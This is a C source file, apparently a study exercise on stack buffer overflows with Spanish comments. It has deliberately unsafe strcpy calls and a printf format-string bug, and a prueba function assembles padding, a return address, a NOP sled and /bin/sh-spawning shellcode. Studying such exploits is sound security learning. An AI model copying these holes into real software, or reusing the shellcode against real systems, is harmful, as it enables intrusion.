#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "hacking.h"

#define FILENAME "/var/notes"

int print_notes(unsigned int, unsigned int, unsigned char *); // Note printing function.
int find_user_note(unsigned int, unsigned int);    // Seek in file for a note for user.
int search_note(unsigned char *, unsigned char *); // Search for keyword function.
void fatal(char *);       // Fatal error handler
char *prueba(unsigned int *pos, unsigned int offset, unsigned int *largo) ;
int main2(int argc, char *argv[]);
void imprime(char *mensaje);
void contenido(unsigned char *mensaje, int largo);

//#define LLAMA_DESDE_NOTESEARCH

int main(int argc, char *argv[])
{
    return main2(argc,argv);
}

int main2(int argc, char *argv[])
{
    unsigned int userid, printing = 1, fd; // File descriptor
    unsigned int largo;
    //El primer argumento es el texto que buscamos
    char searchstring[100];

#ifdef LLAMA_DESDE_NOTESEARCH

    unsigned char * ref;
    if (argc > 1)
    {
        ref=prueba(&userid, atoi(argv[1]), &largo);
    }
    else{
        ref=prueba(&userid, 0, &largo);
    }
    memcpy(searchstring, ref, largo);
#else    
    if (argc > 1)               // If there is an arg,
        strcpy(searchstring, argv[1]); // that is the search string;
    else                               // otherwise,
        searchstring[0] = 0;           // search string is empty.
#endif

    printf("%p\n", searchstring);
    imprime(searchstring);

    //Tomamos el id del usuario que ejecuta el programa
    userid = getuid();

    fd = open(FILENAME, O_RDONLY); // Open the file for read-only access.
    if (fd == -1)
        fatal("in main() while opening file for reading");

    while (printing)
        printing = print_notes(fd, userid, searchstring);
    printf("-------[ end of note data ]-------\n");
    close(fd);
}

// A function to print the notes for a given uid that match
// an optional search string;
// returns 0 at end of file, 1 if there are still more notes.
int print_notes(unsigned int fd, unsigned int uid, unsigned char *searchstring)
{
    unsigned int note_length;
    unsigned char byte = 0, note_buffer[100];
    //Comprueba el tamaño de la nota
    note_length = find_user_note(fd, uid);
    if (note_length == -1)                      // If end of file reached,
        return 0;                               // return 0.
    
    //Lee la nota
    read(fd, note_buffer, note_length);         // Read note data.
    note_buffer[note_length] = 0; // Terminate the string.

    //Busca la nota
    if (search_note(note_buffer, searchstring)) // If searchstring found,
        printf(note_buffer);                    // print the note.
    return 1;
}

// A function to find the next note for a given userID;
// returns -1 if the end of the file is reached;
// otherwise, it returns the length of the found note.
int find_user_note(unsigned int fd, unsigned int user_uid)
{
    unsigned int note_uid = -1;
    unsigned char byte;
    unsigned int length;
    //Busca un entrada para el usur_id
    while (note_uid != user_uid)
    { // Loop until a note for user_uid is found.
        if (read(fd, &note_uid, 4) != 4) // Lee los cuatro caracteres que guardamosr cada user id. Si no hay cuatro caracteres, termina
            return -1;
                               // If 4 bytes aren't read, return end of file code.
        if (read(fd, &byte, 1) != 1)     // Read the newline separator.
            return -1;

        //El cambio de linea
        byte = length = 0;
        
        //Lee la nota
        while (byte != '\n')
        {                                
            //Cuenta los caracteres que tiene la nota
            if (read(fd, &byte, 1) != 1) // Read a single byte.
                return -1;               // If byte isn't read, return end of file code.
            length++;
        }
    }
    //Coloca el puntero justo al inicio de la nota
    lseek(fd, (off_t)(-length), SEEK_CUR); // Rewind file reading by length bytes.
    printf("[DEBUG] found a %d byte note for user id %d\n", length, note_uid);
    //Devuelve el tamaño de la nota
    return length;
}
// A function to search a note for a given keyword;
// returns 1 if a match is found, 0 if there is no match.
int search_note(unsigned char *note, unsigned char *keyword)
{
    unsigned int i, keyword_length, match = 0;
    keyword_length = strlen(keyword);

    //Sino se indica el criterio de búsqueda, se considera un acierto
    if (keyword_length == 0) 
        return 1;            

    //Compara la nota caracter a caracter
    for (i = 0; i < strlen(note); i++)
    {                                  // Iterate over bytes in note.
        if (note[i] == keyword[match]) // If byte matches keyword,
            match++;                   // get ready to check the next byte;
        else
        {                              // otherwise,
            if (note[i] == keyword[0]) // if that byte matches first keyword byte,
                match = 1;             // start the match count at 1.
            else
                match = 0; // Otherwise it is zero.
        }
        //Si todos los caracteres coinciden
        if (match == keyword_length) // If there is a full match,
            return 1;                // return matched.
    }
    return 0; // Return not matched.
}

char *prueba(unsigned int *pos, unsigned int offset, unsigned int *largo)
{

    int pad = 100, //tamaño del buffer de la función + 4
        rep = 10,
        nop = 60,
        code;
    char *explota;
    char *eip;
    unsigned int address;
    char *shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    code = strlen(shellcode);
    *largo = pad + sizeof(eip) * rep + nop + code;
    explota = malloc(*largo);

    /*
    explota es un puntero a la heap.
    
    los datos que coloquemos en este puntero se usaran para hacer el buffer overflow

    Colocaremos lo siguiente:
    - padding. No hace nada, solo sirve de relleno
    - direccion del código a ejecutar. Esta posición tiene que coincidir con el EIP. Tiene que apuntar al código que vamos a incluir - ver siguiente punto. Tiene que apuntar a cualquiera de las instrucciones NOP del código
    - código. El código seran instrucciones NOP seguidas del código que queremos inyectar

    PAD deberá quedar por encima del EIP
    Alguna de las direcciones que informamos como EIP deberá sobre-escribir la direccion de retorno de la pila. 
    La dirección deberá apuntar a la zona donde guardamos NOP
    NOP y el código se 
    PAD
    */

    //PAD
    memset(explota, 0x41, pad);
    //EIP
    eip = pos - offset;
    address = (unsigned int)eip;
    for (int i = 0; i < rep; i++)
    {
        memcpy(&explota[pad + i * sizeof(address)], &address, sizeof(address));
    }
    //NOP
    memset(explota + pad + sizeof(address) * rep, 0x90, nop);
    //Codigo
    memcpy(explota + pad + sizeof(address) * rep + nop, shellcode, code);

    return explota;
}

void imprime(char *mensaje)
{
    char buffer[64];
    strcpy(buffer, mensaje);
    printf("Mensaje: %p\n", buffer);
    contenido(buffer, strlen(buffer));
    return;
}

void contenido(unsigned char *mensaje, int largo)
{
    printf("Mensaje:\n");
    for (int i = 0; i < largo; i++)
    {
        printf("%02x ", mensaje[i]);
        if (i % 16 == 15) // Print a newline every 16 bytes.
            printf("\n");
    }
    printf("\n");
    return;
}